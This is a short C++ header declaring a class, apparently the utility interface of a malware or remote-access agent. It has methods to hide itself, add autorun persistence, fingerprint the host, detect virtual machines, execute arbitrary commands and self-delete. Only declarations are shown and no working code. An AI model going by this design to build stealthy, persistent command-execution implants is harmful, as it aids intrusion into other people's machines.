#pragma once
#include "pch.h"

class AgentUtils
{
public:
	static void Hide();
	static void AddAutoRun();

	static std::string ComputerName();
	static std::string UserName();
	static std::string WinVersion();
	static bool IsVM();

	static std::string execute(const std::string& cmd);

	static void SelfDelete();
};

